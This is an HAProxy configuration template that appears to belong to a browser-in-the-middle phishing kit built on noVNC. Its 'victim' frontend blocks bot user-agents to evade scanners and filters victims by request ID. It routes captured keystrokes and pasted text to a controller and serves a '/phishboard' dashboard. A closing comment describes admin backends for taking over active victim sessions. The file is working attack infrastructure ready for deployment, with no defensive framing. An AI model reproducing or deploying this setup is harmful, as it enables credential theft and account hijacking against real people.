# haproxy.cfg template
# values with ---val--- will get replaced by setup.sh

defaults
	mode http
	option forwardfor
	timeout client 20s
	timeout connect 5s
	timeout server 10s
	timeout http-request 20s
	timeout tunnel 1800s # 30 mins

global
	#lua-load /etc/cors.lua
	stats socket ipv4@0.0.0.0:8000 level admin expose-fd listeners

resolvers res
	parse-resolv-conf
	#nameserver ns1 127.0.0.11:53
	hold valid    3s
	hold other    5s
	hold refused  5s
	hold nx       5s
	hold timeout  5s
	hold obsolete 5s

userlist mycreds
	user ekadmin insecure-password ---adminPass---


frontend admin
	bind :1300 ssl crt /etc/certandkey.pem
	http-request auth unless { http_auth(mycreds) }
	default_backend controller


frontend victim
	bind :443 ssl crt /etc/certandkey.pem
	errorfile 503 /etc/haproxy/503.http
	#http-request lua.cors "GET,PUT,POST" "domain.com" "*"
	#http-request redirect location https://<real-site> unless { urlp(reqid) -m found }
	#http-request redirect scheme https unless { ssl_fc }

	# prevent access from bots (user-agent contains "bot" case insensitive)
	http-request deny if { hdr(User-Agent) -i -m sub bot } 

	# define access token for administrative access to instances
	acl is_admin url_param(accesstoken) ---accessToken---

	# rate limiting: block if more than 10 concurrent connections
	http-request deny deny_status 429 hdr Fuck-Off ":)" if { sc_http_req_rate(0) gt 10 }

	# dont block access if is_admin, reqid in whitelist, accessing js and specific paths
	#http-request deny unless is_admin || { urlp(reqid) -f /etc/whitelist.acl } || { path /websockify } || { path_end .js } || { path_beg /phishboard }
	http-request deny deny_status 400 unless is_admin || { urlp(reqid) -f /etc/whitelist.acl } || { path /websockify } || { path_end .js }

	# block clients with reqid in blacklist (already authenticated)
	http-request deny if { urlp(reqid) -m found } { urlp(reqid) -f /etc/blacklist.acl }

	# detect admins and redirect to admin backend (phisboard and direct access to sessions)
	#use_backend dashboard if { path_beg /phishboard } { urlp(accesstoken) k45 }
	use_backend controller if { path_beg /phishboard } is_admin

	# getting keystrokes or pasted text from victim session
	use_backend controller if { path_beg /input } { urlp(reqid) -m found }	#TODO add svr urlp

	# send all targets to the novnc backend
	default_backend novnc

backend novnc
	balance leastconn
	timeout queue 5s
	cookie _hau maxlife 5m insert indirect nocache secure dynamic
	dynamic-cookie-key ---cookieKey---
	default-server maxconn 1 check init-addr libc,none resolvers res
	#default-server check init-addr libc,none resolvers res


backend controller
	default-server check init-addr libc,none resolvers res
	server dash controller:80

# for each server in novnc backend, there is a separate backend with a single server pointing to the same system for admin access to overtake active victim sessions



